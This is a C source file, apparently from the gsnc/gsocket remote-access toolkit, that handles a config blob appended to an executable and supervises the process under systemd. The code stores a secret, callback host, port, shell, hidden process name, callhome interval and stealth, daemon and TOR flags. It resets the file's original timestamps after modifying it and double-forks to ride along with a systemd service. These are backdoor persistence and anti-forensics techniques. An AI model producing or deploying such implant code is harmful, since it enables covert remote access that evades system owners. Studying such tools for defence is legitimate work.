#include "common.h"
#include "gsnc-utils.h"

// ENV VARIABLES:
// ==============
// CONFIG_WRITE=-           - Write to STDOUT
// CONFIG_WRITE="file.dat"  - Append or overwrite config at the end of file.dat
//
// CONFIG_READ="0"          - Do not read the config at all.
// CONFIG_READ=             - Not set or empty: Read from current executable.
// CONFIG_READ="file.dat"   - Read config from 'file.dat'.
//
// CONFIG_CHECK             - Exit(0) if config exists and is valid.

// read config.
// Position at end of file (or overwrite existing, if magic found at end of file)
// Return 0 if config was read.
static int
config_read(struct gsnc_config *c, FILE *fp) {
    char buf[64];
    int i;
    int ret;

    if (fp == NULL)
        return 202;

    fseek(fp, 0 - sizeof *c, SEEK_END);
    ret = fread(c, sizeof *c, 1, fp);
    
    if (ret != 1)
        return 200;

     // Check magic
    snprintf(buf, sizeof buf, "%s", GSNC_CONFIG_MAGIC_STR);
    for (i = 0; i < sizeof c->magic; i++) {
        if (c->magic[i] != (buf[i] ^ GSNC_CONFIG_MAGIC_XOR))
            return 201;
    }

    fseek(fp, 0 - sizeof *c, SEEK_END);
    return 0;
}

// Store start-up options in a file.
// fn == "-" -> STDOUT
int
GSNC_config_write(const char *fn) {
    FILE *fp = NULL;
    struct gsnc_config c;
    int i;
    char buf[1024];
    int ret = 200;
    char *ptr;
    struct stat sb;
    int is_fix_ts = 0;

    if (fn == NULL) {
        return 254;
    }

	if (gopt.sec_str == NULL) {
		gopt.sec_str = GS_GETENV2("SECRET");
    }

    if (gopt.sec_str == NULL) {
        fprintf(stderr, "-s or GS_SECRET not specified\n");
        return 253;
    }

    if ((fn[0] == '-') && (fn[1] == '\0'))
        fp = stdout;

    if (fp == NULL) {
        fp = fopen(fn, "r+");
        if (fp == NULL) {
            fprintf(stderr, "ERROR: %s: %s\n", fn, strerror(errno));
            goto err;
        }

        if (fstat(fileno(fp), &sb) == 0)
            is_fix_ts = 1;
        config_read(&c, fp);
    }

    memset(&c, 0, sizeof c);
    snprintf(buf, sizeof buf, "%s", GSNC_CONFIG_MAGIC_STR);
    for (i = 0; i < sizeof c.magic; i++) {
        c.magic[i] = buf[i] ^ GSNC_CONFIG_MAGIC_XOR;
    }

    snprintf(c.sec_str, sizeof c.sec_str, "%s", gopt.sec_str);

    // if (gopt.prg_exename)
    //     snprintf(c.prg_exename, sizeof c.prg_exename, "%s", gopt.prg_exename);
    if ((ptr = GS_GETENV2("PROC_HIDDENNAME")) != NULL)
        snprintf(c.proc_hiddenname, sizeof c.proc_hiddenname, "%s", ptr);

    if ((ptr = GS_GETENV2("HOST")) != NULL)
        snprintf(c.host, sizeof c.host, "%s", ptr);

    if ((ptr = GS_GETENV2("PORT")) != NULL)
        c.port = atoi(ptr);

    if ((ptr = GS_getenv("SHELL")) != NULL)
        snprintf(c.shell, sizeof c.shell, "%s", ptr);

    if ((ptr = GS_getenv("DOMAIN")) != NULL)
        snprintf(c.domain, sizeof c.domain, "%s", ptr);

    if ((ptr = GS_getenv("WORKDIR")) != NULL)
        snprintf(c.workdir, sizeof c.workdir, "%s", ptr);

    c.callhome_min = gopt.callhome_sec;
#ifndef DEBUG
    c.callhome_min = gopt.callhome_sec / 60;
#endif
    c.flags |= (gopt.flags & GSC_FL_OPT_TOR);
    c.flags |= (gopt.flags & GSC_FL_OPT_DAEMON);
    c.flags |= (gopt.flags & GSC_FL_OPT_WATCHDOG);
    c.flags |= (gopt.flags & GSC_FL_OPT_QUIET);

    if (fwrite(&c, sizeof c, 1, fp) != 1)
        goto err;
    fp = freopen(NULL, "r", fp); // Must reopen so set timestamp NOW and adjust below:

    if ((fp != NULL) && (is_fix_ts != 0)) {
        // FIX timestamp:
        struct timespec ts[2];
#ifdef __APPLE__
        memcpy(&ts[0], &sb.st_atimespec, sizeof ts[0]);
        memcpy(&ts[1], &sb.st_mtimespec, sizeof ts[1]);
#else
        memcpy(&ts[0], &sb.st_atim, sizeof ts[0]);
        memcpy(&ts[1], &sb.st_mtim, sizeof ts[1]);
#endif    
        // futimens(fileno(fp), &sb.st_atimespec);  # OSX
        futimens(fileno(fp), ts);
    }

    ret = 0;
err:
    XFCLOSE(fp);
    return ret;
}

// Return 0 if config could be read EOF of fn
int
GSNC_config_read(const char *fn) {
    FILE *fp;
    struct gsnc_config c;
    int ret = -1;
    char *ptr;

	ptr = GS_GETENV2("CONFIG_READ");
    if ((ptr != NULL) && (*ptr == '0'))
        return -1; // GS_CONFIG_READ=0, force _not_ reading.

    fn = ptr?:fn;

    if (fn == NULL)
        return -1;
    errno = 0;
    fp = fopen(fn, "rb");
    DEBUGF("fn=%s fp=%p, %s\n", fn, fp, strerror(errno));

    if (fp == NULL)
        return -1;

    if (config_read(&c, fp) != 0)
        goto err;

    gopt.sec_str = strdup(c.sec_str);
    if (c.host[0] != '\0')
        gopt.gs_host = strdup(c.host);
    if (c.shell[0] != '\0')
        gopt.gs_shell = strdup(c.shell);
    if (c.domain[0] != '\0')
        gopt.gs_domain = strdup(c.domain);
    if (c.workdir[0] != '\0')
        gopt.gs_workdir = strdup(c.workdir);
    if (c.proc_hiddenname[0] != '\0')
        gopt.proc_hiddenname = strdup(c.proc_hiddenname);

    gopt.gs_port = c.port;
    gopt.callhome_sec = c.callhome_min;
#ifndef DEBUG
    gopt.callhome_sec = c.callhome_min * 60;
#endif
    gopt.flags |= (c.flags & GSC_FL_OPT_TOR);
    gopt.flags |= (c.flags & GSC_FL_OPT_DAEMON);
    gopt.flags |= (c.flags & GSC_FL_OPT_WATCHDOG);
    gopt.flags |= (c.flags & GSC_FL_OPT_QUIET);

    // Implied:
    gopt.is_interactive = 1;
    gopt.flags |= GSC_FL_IS_SERVER;
    gopt.flags |= GSC_FL_IS_STEALTH;

    ret = 0;
err:
    XFCLOSE(fp);
    return ret;
}

static pid_t sv_pid;

static void
cb_sigforward(int sig) {
    if (sv_pid <= 0)
        return;

    if (sig == SIGCHLD) {
        // This can not happen (we are no longer parent of child's child)
        kill(sv_pid, SIGTERM);
        exit(255);
    }

    if (kill(sv_pid, sig) != 0)
        exit(EX_SIGTERM);

    if (sig == SIGTERM)
        exit(EX_SIGTERM);
}

void
sv_sigforward(int sig) {
    if (sv_pid <= 0)
        return;

    if (kill(sv_pid, sig) != 0)
        sv_pid = 0;
}

// Supervise the original binary.
// The original is spawned as a daemomized child (PPID=1) of gsnc.
// The alternative would be to start gsnc as a child of the original process
// the concerns are:
// - GSNC would start again if the service restarts.
// - GSNC would constantly need to check if (original) parent has
//   restarted
void
init_supervise(int *argc, char *argv[]) {
    char buf[1024];
    pid_t pid;

    if (getenv("SYSTEMD_EXEC_PID") == NULL)
        return; // not started from systemd

    int fds[2];
    socketpair(AF_UNIX, SOCK_STREAM, 0, fds);

    // Double-fork() so that the PPID of this child becomes 1.
    signal(SIGHUP, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);
    if ((pid = fork()) < 0)
        return; // ERROR

    if (pid > 0) {
        // PARENT
        close(fds[1]);
        pid = 0;
        read(fds[0], &sv_pid, sizeof sv_pid);
        close(fds[0]);
        // The command line options are valid for the CHILD only.
        // Child shall ignore them and never use them.
        *argc = 1;
        argv[1] = NULL;

        // Proxy most signals to the real daemon
        signal(SIGHUP, cb_sigforward);
        signal(SIGINT, cb_sigforward);
        signal(SIGQUIT, cb_sigforward);
        signal(SIGUSR1, cb_sigforward);
        signal(SIGUSR2, cb_sigforward);
        signal(SIGPIPE, cb_sigforward);
        signal(SIGTERM, cb_sigforward);
        signal(SIGURG, cb_sigforward);
        signal(SIGWINCH, cb_sigforward);
        return;
    }

    // CHILD
    close(fds[0]);
    if ((pid = fork()) < 0)
        return;
    if (pid > 0) {
        write(fds[1], &pid, sizeof pid);
        read(fds[1], &pid, sizeof pid);
        exit(0);	// child's parent exits.
    }

    //HERE: Child's child (now with PPID==1)
    close(fds[1]);
    signal(SIGHUP, SIG_DFL);
    signal(SIGCHLD, SIG_DFL);

    snprintf(buf, sizeof buf, "%s ", argv[0]);
    execv(buf, argv);

    if (gopt.prg_exename == NULL)
        return;
    snprintf(buf, sizeof buf, "%s ", gopt.prg_exename);
    execv(buf, argv);
    exit(0); // ERROR but exit with 0.
}

